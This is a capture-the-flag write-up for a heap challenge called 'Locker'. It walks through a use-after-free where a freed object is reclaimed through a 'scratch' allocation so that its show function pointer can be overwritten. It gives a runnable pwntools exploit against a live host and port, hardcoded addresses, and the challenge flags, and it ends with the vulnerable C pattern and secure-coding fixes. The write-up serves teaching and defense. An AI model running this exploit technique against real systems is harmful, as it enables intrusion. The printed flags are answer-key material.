# Locker

**Author:** John_x9  
**Difficulty:** Very Hard  
**Connect:** `nc 167.86.100.57:9007`

Campus locker notes: allocate a card, shred it, leave the sticky note pointing at the old desk slot. Menu item **`scratch`** is the reclaim path. Plant a fake `show` pointing at `win_real`, not the decoy `win` on the Skeleton Coast gift shop sticker.

---

## Blind solve path

### 1. Connect

```bash
nc 167.86.100.57 9007
```

```text
Locker
1)new 2)del 3)view 4)upd 5)scratch 6)bye
>
```

Heap note manager. Extra menu: **`scratch`**. That is a red flag in a UAF-shaped menu: raw `malloc` + `read` that is not a full locker object.

### 2. Discover the UAF (remote)

Happy path:

1. `new` `#0`, size `0x40`, fill with `X`s.
2. `view` `#0` → prints your data.
3. `del` `#0`.
4. `view` `#0` again.

If the slot still "works" (prints garbage, crashes, or does not say `empty`), the pointer was **not cleared**. That is **use-after-free**:

- `del` frees memory.
- `boxes[i]` still points at the old place.
- `view` still calls `boxes[i]->show(...)`.

### 3. Reclaim with scratch

After freeing a locker object (~24 bytes of fields → often a `0x20` chunk), a scratch of size `0x18` often **reclaims** that chunk (allocator hands the last free back first).

Write a fake object:

```text
offset 0:  data pointer
offset 8:  size
offset 16: show function pointer
```

Then `view` the dangling index to call your function pointer.

### 4. Decoy vs real

Pointing `show` at decoy `win`:

```text
nustCTF{d3c0y_w1n_n0t_w1n_r34l}
decoy win john_x9
```

Trap. Real prize is `win_real` (opens `flag.txt`).

### 5. Addresses: honest note

No PIE. Nothing prints `win_real@`. You need that address from the organizer binary or the fixed build value:

| Piece | Address |
|-------|---------|
| `win_real` | `0x401396` |
| decoy `win` | `0x401407` |

Fully blind function-pointer guessing across the whole code segment is not practical. Once you have the address, the UAF steps above are pure remote interaction.

### 6. Working remote script

```python
#!/usr/bin/env python3
from pwn import *

HOST = '167.86.100.57'
PORT = 9007
WIN_REAL = 0x401396

context.log_level = 'error'

def menu(io, choice):
    io.recvuntil(b'> ')
    io.sendline(str(choice).encode())

io = remote(HOST, PORT)

menu(io, 1)
io.sendlineafter(b'#>', b'0')
io.sendlineafter(b'sz>', str(0x40).encode())
io.sendafter(b'data>', b'X' * 0x40)

menu(io, 2)
io.sendlineafter(b'#>', b'0')

menu(io, 5)
io.sendlineafter(b'#>', b'1')
io.sendlineafter(b'sz>', str(0x18).encode())
fake = p64(0) + p64(0) + p64(WIN_REAL)
io.sendafter(b'data>', fake.ljust(0x18, b'\x00'))

menu(io, 3)
io.sendlineafter(b'#>', b'0')
print(io.recvall(timeout=2).decode(errors='ignore'))
```

Same script: [`solves/07-locker-solve.py`](solves/07-locker-solve.py). If reclaim misses, spray a few more `scratch` allocs of size `0x18` or `0x20` before `view`.

---

## Real flag

```text
nustCTF{l0ck3r_u4f_n0t_d3c0y}
```

---

## After the event: vulnerable code and how to fix

Vulnerable pattern (illustrative):

```c
void delete(void){
  int i = idx();
  if(!boxes[i]) return;
  free(boxes[i]->data);
  free(boxes[i]);
  /* missing: boxes[i] = NULL; */
}

void view(void){
  int i = idx();
  if(!boxes[i]){ puts("empty"); return; }
  boxes[i]->show(boxes[i]);   /* UAF if delete left a dangling pointer */
}

void scratch_alloc(void){
  /* separate malloc/read path that can reclaim the freed Locker chunk */
  scratch[i] = malloc(n);
  read(0, scratch[i], n);
}
```

`delete` frees without NULLing `boxes[i]`. `scratch` can reclaim the same chunk and rewrite the `show` function pointer.

**Secure coding fixes:**

1. After `free`, always null the slot: `boxes[i] = NULL` (and null `data` before freeing the object if you keep a two-step free).
2. Do not mix "typed object" and "raw byte scratch" allocators of overlapping sizes in the same heap without hardening (separate arenas, type tags, or no scratch API).
3. Consider safe unlinking / pointer integrity schemes, or store indices into a table instead of raw function pointers in reclaimable chunks.
4. Remove decoy and real win symbols from production; open files only on authenticated paths.
